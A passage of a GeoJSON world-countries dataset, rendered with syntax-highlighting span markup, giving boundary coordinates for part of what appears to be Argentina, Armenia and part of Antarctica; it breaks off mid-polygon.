class="hljs-selector-attr">[-57.777217,-25.16234]</span>,<span class="hljs-selector-attr">[-57.63366,-25.603657]</span>,<span class="hljs-selector-attr">[-58.618174,-27.123719]</span>,<span class="hljs-selector-attr">[-57.60976,-27.395899]</span>,<span class="hljs-selector-attr">[-56.486702,-27.548499]</span>,<span class="hljs-selector-attr">[-55.695846,-27.387837]</span>,<span class="hljs-selector-attr">[-54.788795,-26.621786]</span>,<span class="hljs-selector-attr">[-54.625291,-25.739255]</span>,<span class="hljs-selector-attr">[-54.13005,-25.547639]</span>,<span class="hljs-selector-attr">[-53.628349,-26.124865]</span>,<span class="hljs-selector-attr">[-53.648735,-26.923473]</span>,<span class="hljs-selector-attr">[-54.490725,-27.474757]</span>,<span class="hljs-selector-attr">[-55.162286,-27.881915]</span>,<span class="hljs-selector-attr">[-56.2909,-28.852761]</span>,<span class="hljs-selector-attr">[-57.625133,-30.216295]</span>,<span class="hljs-selector-attr">[-57.874937,-31.016556]</span>,<span class="hljs-selector-attr">[-58.14244,-32.044504]</span>,<span class="hljs-selector-attr">[-58.132648,-33.040567]</span>,<span class="hljs-selector-attr">[-58.349611,-33.263189]</span>,<span class="hljs-selector-attr">[-58.427074,-33.909454]</span>,<span class="hljs-selector-attr">[-58.495442,-34.43149]</span>,<span class="hljs-selector-attr">[-57.22583,-35.288027]</span>,<span class="hljs-selector-attr">[-57.362359,-35.97739]</span>,<span class="hljs-selector-attr">[-56.737487,-36.413126]</span>,<span class="hljs-selector-attr">[-56.788285,-36.901572]</span>,<span class="hljs-selector-attr">[-57.749157,-38.183871]</span>,<span class="hljs-selector-attr">[-59.231857,-38.72022]</span>,<span class="hljs-selector-attr">[-61.237445,-38.928425]</span>,<span class="hljs-selector-attr">[-62.335957,-38.827707]</span>,<span class="hljs-selector-attr">[-62.125763,-39.424105]</span>,<span class="hljs-selector-attr">[-62.330531,-40.172586]</span>,<span class="hljs-selector-attr">[-62.145994,-40.676897]</span>,<span class="hljs-selector-attr">[-62.745803,-41.028761]</span>,<span class="hljs-selector-attr">[-63.770495,-41.166789]</span>,<span class="hljs-selector-attr">[-64.73209,-40.802677]</span>,<span class="hljs-selector-attr">[-65.118035,-41.064315]</span>,<span class="hljs-selector-attr">[-64.978561,-42.058001]</span>,<span class="hljs-selector-attr">[-64.303408,-42.359016]</span>,<span class="hljs-selector-attr">[-63.755948,-42.043687]</span>,<span class="hljs-selector-attr">[-63.458059,-42.563138]</span>,<span class="hljs-selector-attr">[-64.378804,-42.873558]</span>,<span class="hljs-selector-attr">[-65.181804,-43.495381]</span>,<span class="hljs-selector-attr">[-65.328823,-44.501366]</span>,<span class="hljs-selector-attr">[-65.565269,-45.036786]</span>,<span class="hljs-selector-attr">[-66.509966,-45.039628]</span>,<span class="hljs-selector-attr">[-67.293794,-45.551896]</span>,<span class="hljs-selector-attr">[-67.580546,-46.301773]</span>,<span class="hljs-selector-attr">[-66.597066,-47.033925]</span>,<span class="hljs-selector-attr">[-65.641027,-47.236135]</span>,<span class="hljs-selector-attr">[-65.985088,-48.133289]</span>,<span class="hljs-selector-attr">[-67.166179,-48.697337]</span>,<span class="hljs-selector-attr">[-67.816088,-49.869669]</span>,<span class="hljs-selector-attr">[-68.728745,-50.264218]</span>,<span class="hljs-selector-attr">[-69.138539,-50.73251]</span>,<span class="hljs-selector-attr">[-68.815561,-51.771104]</span>,<span class="hljs-selector-attr">[-68.149995,-52.349983]</span>,<span class="hljs-selector-attr">[-68.571545,-52.299444]</span>,<span class="hljs-selector-attr">[-69.498362,-52.142761]</span>,<span class="hljs-selector-attr">[-71.914804,-52.009022]</span>,<span class="hljs-selector-attr">[-72.329404,-51.425956]</span>,<span class="hljs-selector-attr">[-72.309974,-50.67701]</span>,<span class="hljs-selector-attr">[-72.975747,-50.74145]</span>,<span class="hljs-selector-attr">[-73.328051,-50.378785]</span>,<span class="hljs-selector-attr">[-73.415436,-49.318436]</span>,<span class="hljs-selector-attr">[-72.648247,-48.878618]</span>,<span class="hljs-selector-attr">[-72.331161,-48.244238]</span>,<span class="hljs-selector-attr">[-72.447355,-47.738533]</span>,<span class="hljs-selector-attr">[-71.917258,-46.884838]</span>,<span class="hljs-selector-attr">[-71.552009,-45.560733]</span>,<span class="hljs-selector-attr">[-71.659316,-44.973689]</span>,<span class="hljs-selector-attr">[-71.222779,-44.784243]</span>,<span class="hljs-selector-attr">[-71.329801,-44.407522]</span>,<span class="hljs-selector-attr">[-71.793623,-44.207172]</span>,<span class="hljs-selector-attr">[-71.464056,-43.787611]</span>,<span class="hljs-selector-attr">[-71.915424,-43.408565]</span>,<span class="hljs-selector-attr">[-72.148898,-42.254888]</span>,<span class="hljs-selector-attr">[-71.746804,-42.051386]</span>,<span class="hljs-selector-attr">[-71.915734,-40.832339]</span>,<span class="hljs-selector-attr">[-71.680761,-39.808164]</span>,<span class="hljs-selector-attr">[-71.413517,-38.916022]</span>,<span class="hljs-selector-attr">[-70.814664,-38.552995]</span>,<span class="hljs-selector-attr">[-71.118625,-37.576827]</span>,<span class="hljs-selector-attr">[-71.121881,-36.658124]</span>,<span class="hljs-selector-attr">[-70.364769,-36.005089]</span>,<span class="hljs-selector-attr">[-70.388049,-35.169688]</span>,<span class="hljs-selector-attr">[-69.817309,-34.193571]</span>,<span class="hljs-selector-attr">[-69.814777,-33.273886]</span>,<span class="hljs-selector-attr">[-70.074399,-33.09121]</span>,<span class="hljs-selector-attr">[-70.535069,-31.36501]</span>,<span class="hljs-selector-attr">[-69.919008,-30.336339]</span>,<span class="hljs-selector-attr">[-70.01355,-29.367923]</span>,<span class="hljs-selector-attr">[-69.65613,-28.459141]</span>,<span class="hljs-selector-attr">[-69.001235,-27.521214]</span>,<span class="hljs-selector-attr">[-68.295542,-26.89934]</span>,<span class="hljs-selector-attr">[-68.5948,-26.506909]</span>,<span class="hljs-selector-attr">[-68.386001,-26.185016]</span>,<span class="hljs-selector-attr">[-68.417653,-24.518555]</span>,<span class="hljs-selector-attr">[-67.328443,-24.025303]</span>,<span class="hljs-selector-attr">[-66.985234,-22.986349]</span>,<span class="hljs-selector-attr">[-67.106674,-22.735925]</span>,<span class="hljs-selector-attr">[-66.273339,-21.83231]</span>,<span class="hljs-selector-attr">[-64.964892,-22.075862]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ARM</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Armenia</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[43.582746,41.092143]</span>,<span class="hljs-selector-attr">[44.97248,41.248129]</span>,<span class="hljs-selector-attr">[45.179496,40.985354]</span>,<span class="hljs-selector-attr">[45.560351,40.81229]</span>,<span class="hljs-selector-attr">[45.359175,40.561504]</span>,<span class="hljs-selector-attr">[45.891907,40.218476]</span>,<span class="hljs-selector-attr">[45.610012,39.899994]</span>,<span class="hljs-selector-attr">[46.034534,39.628021]</span>,<span class="hljs-selector-attr">[46.483499,39.464155]</span>,<span class="hljs-selector-attr">[46.50572,38.770605]</span>,<span class="hljs-selector-attr">[46.143623,38.741201]</span>,<span class="hljs-selector-attr">[45.735379,39.319719]</span>,<span class="hljs-selector-attr">[45.739978,39.473999]</span>,<span class="hljs-selector-attr">[45.298145,39.471751]</span>,<span class="hljs-selector-attr">[45.001987,39.740004]</span>,<span class="hljs-selector-attr">[44.79399,39.713003]</span>,<span class="hljs-selector-attr">[44.400009,40.005]</span>,<span class="hljs-selector-attr">[43.656436,40.253564]</span>,<span class="hljs-selector-attr">[43.752658,40.740201]</span>,<span class="hljs-selector-attr">[43.582746,41.092143]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ATA</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Antarctica</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[-59.572095,-80.040179]</span>,<span class="hljs-selector-attr">[-59.865849,-80.549657]</span>,<span class="hljs-selector-attr">[-60.159656,-81.000327]</span>,<span class="hljs-selector-attr">[-62.255393,-80.863178]</span>,<span class="hljs-selector-attr">[-64.488125,-80.921934]</span>,<span class="hljs-selector-attr">[-65.741666,-80.588827]</span>,<span class="hljs-selector-attr">[-65.741666,-80.549657]</span>,<span class="hljs-selector-attr">[-66.290031,-80.255773]</span>,<span class="hljs-selector-attr">[-64.037688,-80.294944]</span>,<span class="hljs-selector-attr">[-61.883246,-80.39287]</span>,<span class="hljs-selector-attr">[-61.138976,-79.981371]</span>,<span class="hljs-selector-attr">[-60.610119,-79.628679]</span>,<span class="hljs-selector-attr">[-59.572095,-80.040179]</span>]],<span class="hljs-selector-attr">[[[-159.208184,-79.497059]</span>,<span class="hljs-selector-attr">[-161.127601,-79.634209]</span>,<span class="hljs-selector-attr">[-162.439847,-79.281465]</span>,<span class="hljs-selector-attr">[-163.027408,-78.928774]</span>,<span class="hljs-selector-attr">[-163.066604,-78.869966]</span>,<span class="hljs-selector-attr">[-163.712896,-78.595667]</span>,<span class="hljs-selector-attr">[-163.712896,-78.595667]</span>,<span class="hljs-selector-attr">[-163.105801,-78.223338]</span>,<span class="hljs-selector-attr">[-161.245113,-78.380176]</span>,<span class="hljs-selector-attr">[-160.246208,-78.693645]</span>,<span class="hljs-selector-attr">[-159.482405,-79.046338]</span>,<span class="hljs-selector-attr">[-159.208184,-79.497059]</span>]],<span class="hljs-selector-attr">[[[-45.154758,-78.04707]</span>,<span class="hljs-selector-attr">[-43.920828,-78.478103]</span>,<span class="hljs-selector-attr">[-43.48995,-79.08556]</span>,<span class="hljs-selector-attr">[-43.372438,-79.516645]</span>,<span class="hljs-selector-attr">[-43.333267,-80.026123]</span>,<span class="hljs-selector-attr">[-44.880537,-80.339644]</span>,<span class="hljs-selector-attr">[-46.506174,-80.594357]</span>,<span class="hljs-selector-attr">[-48.386421,-80.829485]</span>,<span class="hljs-selector-attr">[-50.482107,-81.025442]</span>,<span class="hljs-selector-attr">[-52.851988,-80.966685]</span>,<span class="hljs-selector-attr">[-54.164259,-80.633528]</span>,<span class="hljs-selector-attr">[-53.987991,-80.222028]</span>,<span class="hljs-selector-attr">[-51.853134,-79.94773]</span>,<span class="hljs-selector-attr">[-50.991326,-79.614623]</span>,<span class="hljs-selector-attr">[-50.364595,-79.183487]</span>,<span class="hljs-selector-attr">[-49.914131,-78.811209]</span>,<span class="hljs-selector-attr">[-49.306959,-78.458569]</span>,<span class="hljs-selector-attr">[-48.660616,-78.047018]</span>,<span class="hljs-selector-attr">[-48.660616,-78.047019]</span>,<span class="hljs-selector-attr">[-48.151396,-78.04707]</span>,<span class="hljs-selector-attr">[-46.662857,-77.831476]</span>,<span class="hljs-selector-attr">[-45.154758,-78.04707]</span>]],<span class="hljs-selector-attr">[[[-121.211511,-73.50099]</span>,<span class="hljs-selector-attr">[-119.918851,-73.657725]</span>,<span class="hljs-selector-attr">[-118.724143,-73.481353]</span>,<span class="hljs-selector-attr">[-119.292119,-73.834097]</span>,<span class="hljs-selector-attr">[-120.232217,-74.08881]</span>,<span class="hljs-selector-attr">[-121.62283,-74.010468]</span>,<span class="hljs-selector-attr">[-122.621735,-73.657778]</span>,<span class="hljs-selector-attr">[-122.621735,-73.657777]</span>,<span class="hljs-selector-attr">[-122.406245,-73.324619]</span>,<span class="hljs-selector-attr">[-121.211511,-73.50099]</span>]],<span class="hljs-selector-attr">[[[-125.559566,-73.481353]</span>,<span class="hljs-selector-attr">[-124.031882,-73.873268]</span>,<span class="hljs-selector-attr">[-124.619469,-73.834097]</span>,<span class="hljs-selector-attr">[-125.912181,-73.736118]</span>,<span class="hljs-selector-attr">[-127.28313,-73.461769]</span>,<span class="hljs-selector-attr">[-127.28313,-73.461768]</span>,<span class="hljs-selector-attr">[-126.558472,-73.246226]</span>,<span class="hljs-selector-attr">[-125.559566,-73.481353]</span>]],<span class="hljs-selector-attr">[[[-98.98155,-71.933334]</span>,<span class="hljs-selector-attr">[-97.884743,-72.070535]</span>,<span class="hljs-selector-attr">[-96.787937,-71.952971]</span>,<span class="hljs-selector-attr">[-96.20035,-72.521205]</span>,<span class="hljs-selector-attr">[-96.983765,-72.442864]</span>,<span class="hljs-selector-attr">[-98.198083,-72.482035]</span>,<span class="hljs-selector-attr">[-99.432013,-72.442864]</span>,<span class="hljs-selector-attr">[-100.783455,-72.50162]</span>,<span class="hljs-selector-attr">[-101.801868,-72.305663]</span>,<span class="hljs-selector-attr">[-102.330725,-71.894164]</span>,<span class="hljs-selector-attr">[-102.330725,-71.894164]</span>,<span class="hljs-selector-attr">[-101.703967,-71.717792]</span>,<span class="hljs-selector-attr">[-100.430919,-71.854993]</span>,<span class="hljs-selector-attr">[-98.98155,-71.933334]</span>]],<span class="hljs-selector-attr">[[[-68.451346,-70.955823]</span>,<span class="hljs-selector-attr">[-68.333834,-71.406493]</span>,<span class="hljs-selector-attr">[-68.510128,-71.798407]</span>,<span class="hljs-selector-attr">[-68.784297,-72.170736]</span>,<span class="hljs-selector-attr">[-69.959471,-72.307885]</span>,<span class="hljs-selector-attr">[-71.075889,-72.503842]</span>,<span class="hljs-selector-attr">[-72.388134,-72.484257]</span>,<span class="hljs-selector-attr">[-71.8985,-72.092343]</span>,<span class="hljs-selector-attr">[-73.073622,-72.229492]</span>,<span class="hljs-selector-attr">[-74.19004,-72.366693]</span>,<span class="hljs-selector-attr">[-74.953895,-72.072757]</span>,<span class="hljs-selector-attr">[-75.012625,-71.661258]</span>,<span class="hljs-selector-attr">[-73.915819,-71.269345]</span>,<span class="hljs-selector-attr">[-73.915819,-71.269344]</span>,<span class="hljs-selector-attr">[-73.230331,-71.15178]</span>,<span class="hljs-selector-attr">[-72.074717,-71.190951]</span>,<span class="hljs-selector-attr">[-71.780962,-70.681473]</span>,<span class="hljs-selector-attr">[-71.72218,-70.309196]</span>,<span class="hljs-selector-attr">[-71.741791,-69.505782]</span>,<span class="hljs-selector-attr">[-71.173815,-69.035475]</span>,<span class="hljs-selector-attr">[-70.253252,-68.87874]</span>,<span class="hljs-selector-attr">[-69.724447,-69.251017]</span>,<span class="hljs-selector-attr">[-69.489422,-69.623346]</span>,<span class="hljs-selector-attr">[-69.058518,-70.074016]</span>,<span class="hljs-selector-attr">[-68.725541,-70.505153]</span>,<span class="hljs-selector-attr">[-68.451346,-70.955823]</span>]],<span class="hljs-selector-attr">[[[-58.614143,-64.152467]</span>,<span class="hljs-selector-attr">[-59.045073,-64.36801]</span>,<span class="hljs-selector-attr">[-59.789342,-64.211223]</span>,<span class="hljs-selector-attr">[-60.611928,-64.309202]</span>,<span class="hljs-selector-attr">[-61.297416,-64.54433]</span>,<span class="hljs-selector-attr">[-62.0221,-64.799094]</span>,<span class="hljs-selector-attr">[-62.51176,-65.09303]</span>,<span class="hljs-selector-attr">[-62.648858,-65.484942]</span>,<span class="hljs-selector-attr">[-62.590128,-65.857219]</span>,<span class="hljs-selector-attr">[-62.120079,-66.190326]</span>,<span class="hljs-selector-attr">[-62.805567,-66.425505]</span>,<span class="hljs-selector-attr">[-63.74569,-66.503847]</span>,<span class="hljs-selector-attr">[-64.294106,-66.837004]</span>,<span class="hljs-selector-attr">[-64.881693,-67.150474]</span>,<span class="hljs-selector-attr">[-65.508425,-67.58161]</span>,<span class="hljs-selector-attr">[-65.665082,-67.953887]</span>,<span class="hljs-selector-attr">[-65.312545,-68.365335]</span>,<span class="hljs-selector-attr">[-64.783715,-68.678908]</span>,<span class="hljs-selector-attr">[-63.961103,-68.913984]</span>,<span class="hljs-selector-attr">[-63.1973,-69.227556]</span>,<span class="hljs-selector-attr">[-62.785955,-69.619419]</span>,<span class="hljs-selector-attr">[-62.570516,-69.991747]</span>,<span class="hljs-selector-attr">[-62.276736,-70.383661]</span>,<span class="hljs-selector-attr">[-61.806661,-70.716768]</span>,<span class="hljs-selector-attr">[-61.512906,-71.089045]</span>,<span class="hljs-selector-attr">[-61.375809,-72.010074]</span>,<span class="hljs-selector-attr">[-61.081977,-72.382351]</span>,<span class="hljs-selector-attr">[-61.003661,-72.774265]</span>,<span class="hljs-selector-attr">[-60.690269,-73.166179]</span>,<span class="hljs-selector-attr">[-60.827367,-73.695242]</span>,<span class="hljs-selector-attr">[-61.375809,-74.106742]</span>,<span class="hljs-selector-attr">[-61.96337,-74.439848]</span>,<span class="hljs-selector-attr">[-63.295201,-74.576997]</span>,<span class="hljs-selector-attr">[-63.74569,-74.92974]</span>,<span class="hljs-selector-attr">[-64.352836,-75.262847]</span>,<span class="hljs-selector-attr">[-65.860987,-75.635124]</span>,<span class="hljs-selector-attr">[-67.192818,-75.79191]</span>,<span class="hljs-selector-attr">[-68.446282,-76.007452]</span>,<span class="hljs-selector-attr">[-69.797724,-76.222995]</span>,<span class="hljs-selector-attr">[-70.600724,-76.634494]</span>,<span class="hljs-selector-attr">[-72.206776,-76.673665]</span>,<span class="hljs-selector-attr">[-73.969536,-76.634494]</span>,<span class="hljs-selector-attr">[-75.555977,-76.712887]</span>,<span class="hljs-selector-attr">[-77.24037,-76.712887]</span>,<span class="hljs-selector-attr">[-76.926979,-77.104802]</span>,<span class="hljs-selector-attr">[-75.399294,-77.28107]</span>,<span class="hljs-selector-attr">[-74.282876,-77.55542]</span>,<span class="hljs-selector-attr">[-73.656119,-77.908112]</span>,<span class="hljs-selector-attr">[-74.772536,-78.221633]</span>,<span class="hljs-selector-attr">[-76.4961,-78.123654]</span>,<span class="hljs-selector-attr">[-77.925858,-78.378419]</span>,<span class="hljs-selector-attr">[-77.984666,-78.789918]</span>,<span class="hljs-selector-attr">[-78.023785,-79.181833]</span>,<span class="hljs-selector-attr">[-76.848637,-79.514939]</span>,<span class="hljs-selector-attr">[-76.633224,-79.887216]</span>,<span class="hljs-selector-attr">[-75.360097,-80.259545]</span>,<span class="hljs-selector-attr">[-73.244852,-80.416331]</span>,<span class="hljs-selector-attr">[-71.442946,-80.69063]</span>,<span class="hljs-selector-attr">[-70.013163,-81.004151]</span>,<span class="hljs-selector-attr">[-68.191646,-81.317672]</span>,<span class="hljs-selector-attr">[-65.704279,-81.474458]</span>,<span class="hljs-selector-attr">[-63.25603,-81.748757]</span>,<span class="hljs-selector-attr">[-61.552026,-82.042692]</span>,<span class="hljs-selector-attr">[-59.691416,-82.37585]</span>,<span class="hljs-selector-attr">[-58.712121,-82.846106]</span>,<span class="hljs-selector-attr">[-58.222487,-83.218434]</span>,<span class="hljs-selector-attr">[-57.008117,-82.865691]</span>,<span class="hljs-selector-attr">[-55.362894,-82.571755]</span>,<span class="hljs-selector-attr">[-53.619771,-82.258235]</span>,<span class="hljs-selector-attr">[-51.543644,-82.003521]</span>,<span class="hljs-selector-attr">[-49.76135,-81.729171]</span>,<span class="hljs-selector-attr">[-47.273931,-81.709586]</span>,<span class="hljs-selector-attr">[-44.825708,-81.846735]</span>,<span class="hljs-selector-attr">[-42.808363,-82.081915]</span>,<span class="hljs-selector-attr">[-42.16202,-81.65083]</span>,<span class="hljs-selector-attr">[-40.771433,-81.356894]</span>,<span class="hljs-selector-attr">[-38.244818,-81.337309]</span>,<span class="hljs-selector-attr">[-36.26667,-81.121715]</span>,<span class="hljs-selector-attr">[-34.386397,-80.906172]</span>,<span class="hljs-selector-attr">[-32.310296,-80.769023]</span>,<span class="hljs-selector-attr">[-30.097098,-80.592651]</span>,<span class="hljs-selector-attr">[-28.549802,-80.337938]</span>,<span class="hljs-selector-attr">[-29.254901,-79.985195]</span>,<span class="hljs-selector-attr">[-29.685805,-79.632503]</span>,<span class="hljs-selector-attr">[-29.685805,-79.260226]</span>,<span class="hljs-selector-attr">[-31.624808,-79.299397]</span>,<span class="hljs-selector-attr">[-33.681324,-79.456132]</span>,<span class="hljs-selector-attr">[-35.639912,-79.456132]</span>,<span class="hljs-selector-attr">[-35.914107,-79.083855]</span>,<span class="hljs-selector-attr">[-35.77701,-78.339248]</span>,<span class="hljs-selector-attr">[-35.326546,-78.123654]</span>,<span class="hljs-selector-attr">[-33.896763,-77.888526]</span>,<span class="hljs-selector-attr">[-32.212369,-77.65345]</span>,<span class="hljs-selector-attr">[-30.998051,-77.359515]</span>,<span class="hljs-selector-attr">[-29.783732,-77.065579]</span>,<span class="hljs-selector-attr">[-28.882779,-76.673665]</span>,<span class="hljs-selector-attr">[-27.511752,-76.497345]</span>,<span class="hljs-selector-attr">[-26.160336,-76.360144]</span>,<span class="hljs-selector-attr">[-25.474822,-76.281803]</span>,<span class="hljs-selector-attr">[-23.927552,-76.24258]</span>,<span class="hljs-selector-attr">[-22.458598,-76.105431]</span>,<span class="hljs-selector-attr">[-21.224694,-75.909474]</span>,<span class="hljs-selector-attr">[-20.010375,-75.674346]</span>,<span class="hljs-selector-attr">[-18.913543,-75.439218]</span>,<span class="hljs-selector-attr">[-17.522982,-75.125698]</span>,<span class="hljs-selector-attr">[-16.641589,-74.79254]</span>,<span class="hljs-selector-attr">[-15.701491,-74.498604]</span>,<span class="hljs-selector-attr">[-15.40771,-74.106742]</span>,<span class="hljs-selector-attr">[-16.46532,-73.871614]</span>,<span class="hljs-selector-attr">[-16.112784,-73.460114]</span>,<span class="hljs-selector-attr">[-15.446855,-73.146542]</span>,<span class="hljs-selector-attr">[-14.408805,-72.950585]</span>,<span class="hljs-selector-attr">[-13.311973,-72.715457]</span>,<span class="hljs-selector-attr">[-12.293508,-72.401936]</span>,<span class="hljs-selector-attr">[-11.510067,-72.010074]</span>,<span class="hljs-selector-attr">[-11.020433,-71.539767]</span>,<span class="hljs-selector-attr">[-10.295774,-71.265416]</span>,<span class="hljs-selector-attr">[-9.101015,-71.324224]</span>,<span class="hljs-selector-attr">[-8.611381,-71.65733]</span>,<span class="hljs-selector-attr">[-7.416622,-71.696501]</span>,<span class="hljs-selector-attr">[-7.377451,-71.324224]</span>,<span class="hljs-selector-attr">[-6.868232,-70.93231]</span>,<span class="hljs-selector-attr">[-5.790985,-71.030289]</span>,<span class="hljs-selector-attr">[-5.536375,-71.402617]</span>,<span class="hljs-selector-attr">[-4.341667,-71.461373]</span>,<span class="hljs-selector-attr">[-3.048981,-71.285053]</span>,<span class="hljs-selector-attr">[-1.795492,-71.167438]</span>,<span class="hljs-selector-attr">[-0.659489,-71.226246]</span>,<span class="hljs-selector-attr">[-0.228637,-71.637745]</span>,<span class="hljs-selector-attr">[0.868195,-71.304639]</span>,<span class="hljs-selector-attr">[1.886686,-71.128267]</span>,<span class="hljs-selector-attr">[3.022638,-70.991118]</span>,<span class="hljs-selector-attr">[4.139055,-70.853917]</span>,<span class="hljs-selector-attr">[5.157546,-70.618789]</span>,<span class="hljs-selector-attr">[6.273912,-70.462055]</span>,<span class="hljs-selector-attr">[7.13572,-70.246512]</span>,<span class="hljs-selector-attr">[7.742866,-69.893769]</span>,<span class="hljs-selector-attr">[8.48711,-70.148534]</span>,<span class="hljs-selector-attr">[9.525135,-70.011333]</span>,<span class="hljs-selector-attr">[10.249845,-70.48164]</span>,<span class="hljs-selector-attr">[10.817821,-70.834332]</span>,<span class="hljs-selector-attr">[11.953824,-70.638375]</span>,<span class="hljs-selector-attr">[12.404287,-70.246512]</span>,<span class="hljs-selector-attr">[13.422778,-69.972162]</span>,<span class="hljs-selector-attr">[14.734998,-70.030918]</span>,<span class="hljs-selector-attr">[15.126757,-70.403247]</span>,<span class="hljs-selector-attr">[15.949342,-70.030918]</span>,<span class="hljs-selector-attr">[17.026589,-69.913354]</span>,<span class="hljs-selector-attr">[18.201711,-69.874183]</span>,<span class="hljs-selector-attr">[19.259373,-69.893769]</span>,<span class="hljs-selector-attr">[20.375739,-70.011333]</span>,<span class="hljs-selector-attr">[21.452985,-70.07014]</span>,<span class="hljs-selector-attr">[21.923034,-70.403247]</span>,<span class="hljs-selector-attr">[22.569403,-70.697182]</span>,<span class="hljs-selector-attr">[23.666184,-70.520811]</span>,<span class="hljs-selector-attr">[24.841357,-70.48164]</span>,<span class="hljs-selector-attr">[25.977309,-70.48164]</span>,<span class="hljs-selector-attr">[27.093726,-70.462055]</span>,<span class="hljs-selector-attr">[28.09258,-70.324854]</span>,<span class="hljs-selector-attr">[29.150242,-70.20729]</span>,<span class="hljs-selector-attr">[30.031583,-69.93294]</span>,<span class="hljs-selector-attr">[30.971733,-69.75662]</span>,<span class="hljs-selector-attr">[31.990172,-69.658641]</span>,<span class="hljs-selector-attr">[32.754053,-69.384291]</span>,<span class="hljs-selector-attr">[33.302443,-68.835642]</span>,<span class="hljs-selector-attr">[33.870419,-68.502588]</span>,<span class="hljs-selector-attr">[34.908495,-68.659271]</span>,<span class="hljs-selector-attr">[35.300202,-69.012014]</span>,<span class="hljs-selector-attr">[36.16201,-69.247142]</span>,<span class="hljs-selector-attr">[37.200035,-69.168748]</span>,<span class="hljs-selector-attr">[37.905108,-69.52144]</span>,<span class="hljs-selector-attr">[38.649404,-69.776205]</span>,<span class="hljs-selector-attr">[39.667894,-69.541077]</span>,<span class="hljs-selector-attr">[40.020431,-69.109941]</span>,<span class="hljs-selector-attr">[40.921358,-68.933621]</span>,<span class="hljs-selector-attr">[41.959434,-68.600514]</span>,<span class="hljs-selector-attr">[42.938702,-68.463313]</span>,<span class="hljs-selector-attr">[44.113876,-68.267408]</span>,<span class="hljs-selector-attr">[44.897291,-68.051866]</span>,<span class="hljs-selector-attr">[45.719928,-67.816738]</span>,<span class="hljs-selector-attr">[46.503343,-67.601196]</span>,<span class="hljs-selector-attr">[47.44344,-67.718759]</span>,<span class="hljs-selector-attr">[48.344419,-67.366068]</span>,<span class="hljs-selector-attr">[48.990736,-67.091718]</span>,<span class="hljs-selector-attr">[49.930885,-67.111303]</span>,<span class="hljs-selector-attr">[50.753471,-66.876175]</span>,<span class="hljs-selector-attr">[50.949325,-66.523484]</span>,<span class="hljs-selector-attr">[51.791547,-66.249133]</span>,<span class="hljs-selector-attr">[52.614133,-66.053176]</span>,<span class="hljs-selector-attr">[53.613038,-65.89639]</span>,<span class="hljs-selector-attr">[54.53355,-65.818049]</span>,<span class="hljs-selector-attr">[55.414943,-65.876805]</span>,<span class="hljs-selector-attr">[56.355041,-65.974783]</span>,<span class="hljs-selector-attr">[57.158093,-66.249133]</span>,<span class="hljs-selector-attr">[57.255968,-66.680218]</span>,<span class="hljs-selector-attr">[58.137361,-67.013324]</span>,<span class="hljs-selector-attr">[58.744508,-67.287675]</span>,<span class="hljs-selector-attr">[59.939318,-67.405239]</span>,<span class="hljs-selector-attr">[60.605221,-67.679589]</span>,<span class="hljs-selector-attr">[61.427806,-67.953887]</span>,<span class="hljs-selector-attr">[62.387489,-68.012695]</span>,<span class="hljs-selector-attr">[63.19049,-67.816738]</span>,<span class="hljs-selector-attr">[64.052349,-67.405239]</span>,<span class="hljs-selector-attr">[64.992447,-67.620729]</span>,<span class="hljs-selector-attr">[65.971715,-67.738345]</span>,<span class="hljs-selector-attr">[66.911864,-67.855909]</span>,<span class="hljs-selector-attr">[67.891133,-67.934302]</span>,<span class="hljs-selector-attr">[68.890038,-67.934302]</span>,<span class="hljs-selector-attr">[69.712624,-68.972791]</span>,<span class="hljs-selector-attr">[69.673453,-69.227556]</span>,<span class="hljs-selector-attr">[69.555941,-69.678226]</span>,<span class="hljs-selector-attr">[68.596258,-69.93294]</span>,<span class="hljs-selector-attr">[67.81274,-70.305268]</span>,<span class="hljs-selector-attr">[67.949889,-70.697182]</span>,<span class="hljs-selector-attr">[69.066307,-70.677545]</span>,<span class="hljs-selector-attr">[68.929157,-71.069459]</span>,<span class="hljs-selector-attr">[68.419989,-71.441788]</span>,<span class="hljs-selector-attr">[67.949889,-71.853287]</span>,<span class="hljs-selector-attr">[68.71377,-72.166808]</span>,<span class="hljs-selector-attr">[69.869307,-72.264787]</span>,<span class="hljs-selector-attr">[71.024895,-72.088415]</span>,<span class="hljs-selector-attr">[71.573285,-71.696501]</span>,<span class="hljs-selector-attr">[71.906288,-71.324224]</span>,<span class="hljs-selector-attr">[72.454627,-71.010703]</span>,<span class="hljs-selector-attr">[73.08141,-70.716768]</span>,<span class="hljs-selector-attr">[73.33602,-70.364024]</span>,<span class="hljs-selector-attr">[73.864877,-69.874183]</span>,<span class="hljs-selector-attr">[74.491557,-69.776205]</span>,<span class="hljs-selector-attr">[75.62756,-69.737034]</span>,<span class="hljs-selector-attr">[76.626465,-69.619419]</span>,<span class="hljs-selector-attr">[77.644904,-69.462684]</span>,<span class="hljs-selector-attr">[78.134539,-69.07077]</span>,<span class="hljs-selector-attr">[78.428371,-68.698441]</span>,<span class="hljs-selector-attr">[79.113859,-68.326216]</span>,<span class="hljs-selector-attr">[80.093127,-68.071503]</span>,<span class="hljs-selector-attr">[80.93535,-67.875546]</span>,<span class="hljs-selector-attr">[81.483792,-67.542388]</span>,<span class="hljs-selector-attr">[82.051767,-67.366068]</span>,<span class="hljs-selector-attr">[82.776426,-67.209282]</span>,<span class="hljs-selector-attr">[83.775331,-67.30726]</span>,<span class="hljs-selector-attr">[84.676206,-67.209282]</span>,<span class="hljs-selector-attr">[85.655527,-67.091718]</span>,<span class="hljs-selector-attr">[86.752359,-67.150474]</span>,<span class="hljs-selector-attr">[87.477017,-66.876175]</span>,<span class="hljs-selector-attr">[87.986289,-66.209911]</span>,<span 